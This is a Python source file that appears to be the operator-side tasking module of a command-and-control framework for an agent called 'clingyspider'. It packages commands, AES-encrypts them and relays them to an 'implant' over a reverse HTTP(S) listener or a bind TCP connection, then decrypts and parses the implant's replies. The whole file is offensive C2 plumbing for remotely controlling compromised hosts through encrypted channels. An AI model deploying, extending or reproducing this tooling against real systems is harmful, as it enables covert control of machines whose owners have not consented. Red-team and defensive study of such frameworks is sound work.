import eternalhush as eh
from additional.clingyspider import __cmd_builder as cmd_builder
from additional.clingyspider import __response_parser as response_parser
from additional.clingyspider import __systemapi as systemapi
import requests
import base64
import json
import inspect
import random

def call(data: bytes, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    session_key = eh.ui.GetEnv("CLSP_KEY")
    next_iv = eh.ui.GetEnv("CLSP_IV")

    task_rid = random.randint(0, 0xffffffff)
    data = task_rid.to_bytes(4, 'big') + data
    data = workerctx.to_bytes(4, 'little') + data #add workerctx id
    
    encrypted_data = eh.crypto.EncryptAesData(session_key, next_iv, data)
    parser = response_parser.ResponseParser()

    if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http" or eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http_ssl":
        listener_port = eh.ui.GetEnv("HTTP_LISTENER_PORT")
        session = eh.ui.GetEnv("CLSP_SESSION")
        encoded = base64.b64encode(encrypted_data)
        task_result_to = int(eh.ui.GetEnv("CLSP_TASK_RESULT_TIMEOUT"))
        if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http_ssl":
            PROTOCOL_PREFIX = "https"
        else:
            PROTOCOL_PREFIX = "http"

        try:
            requests.post(PROTOCOL_PREFIX+"://127.0.0.1:"+listener_port+"/create", verify=False,headers={'Cookie': session, 'task_rid': str(task_rid)}, json={"session_id": session, "data": encoded.decode(), "response": 0, "result":0,  "original_size":0})
            r = requests.get(PROTOCOL_PREFIX+"://127.0.0.1:"+listener_port+"/fetch", verify=False, headers={'Cookie': session, 'task_rid': str(task_rid)}, timeout=task_result_to)
        except requests.exceptions.ReadTimeout:
            eh.ui.Echo("Task completed with error! ("+ inspect.stack()[1][3] +": web-server timeout exceeded)", eh.ECHO_ERROR)
            requests.get(PROTOCOL_PREFIX+"://127.0.0.1:"+listener_port+"/remove", verify=False, headers={'Cookie': session, 'task_rid': str(task_rid)})
            return
        except requests.exceptions.ConnectionError:
            eh.ui.Echo("Task completed with error! ("+ inspect.stack()[1][3] +": web-server connection refused)", eh.ECHO_ERROR) 
            requests.get(PROTOCOL_PREFIX+"://127.0.0.1:"+listener_port+"/remove", verify=False, headers={'Cookie': session, 'task_rid': str(task_rid)})
            return
        if r.status_code != 200:
            eh.ui.Echo("Task completed with error! ("+ inspect.stack()[1][3] +": internal web-server error)", eh.ECHO_ERROR)
            requests.get(PROTOCOL_PREFIX+"://127.0.0.1:"+listener_port+"/remove", verify=False, headers={'Cookie': session, 'task_rid': str(task_rid)})
            return
        response_data = base64.b64decode(r.text)
        response_data = json.loads(response_data)
        decrypted = eh.crypto.DecryptAesData(session_key, next_iv, base64.b64decode(response_data['response']))

        parser.load_data(decrypted)
        no_error = parser.get_byte()
        error_code = parser.get_int()
        eh.ui.SetLastError(error_code)

        if not no_error:
            eh.ui.Echo("Task completed with error! ("+ inspect.stack()[1][3] +": returned "+ hex(error_code) +")", eh.ECHO_ERROR) 
            return
        return parser.dump()
        
    if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "bind_tcp":
        tcp_connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
        builder.add_bstrarg(encrypted_data)
        eh.net.TcpSend(tcp_connection, builder.build_nocmd())
        hdr_size_bytes = eh.net.TcpRecv(tcp_connection, eh.LONG)
        if hdr_size_bytes == -1:
            eh.ui.Echo("Implant closed connection! (hdr_size is less than 0)", eh.ECHO_WARNING) 
            return -1
        encrypted_data_size = int.from_bytes(hdr_size_bytes, "big")
        encrypted_data = eh.net.TcpRecvAll(tcp_connection, encrypted_data_size)
        decrypted = eh.crypto.DecryptAesData(session_key, next_iv, encrypted_data)
        parser.load_data(decrypted)
        no_error = parser.get_byte()
        error_code = parser.get_int()
        eh.ui.SetLastError(error_code)

        if not no_error:
            eh.ui.Echo("Task completed with error! ("+ inspect.stack()[1][3] +": returned "+ hex(error_code) +")", eh.ECHO_ERROR) 
            return
        return parser.dump()

def call_one_arg(code, arg: str, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_strarg(arg)
    return call(builder.build(), workerctx=workerctx)

def call_one_barg(code, arg: bytes, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_bstrarg(arg)
    return call(builder.build(), workerctx=workerctx)

def call_one_iarg(code, arg: int, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_int(arg)
    return call(builder.build(), workerctx=workerctx)

def call_one_sarg(code, arg: int, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_short(arg)
    return call(builder.build(), workerctx=workerctx)

def call_one_larg(code, arg: int, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_long(arg)
    return call(builder.build(), workerctx=workerctx)

def call_no_arg(code, workerctx=0):
    builder = cmd_builder.CommandBuilder()
    builder.set_command(code)
    builder.add_int(0)
    return call(builder.build(), workerctx=workerctx)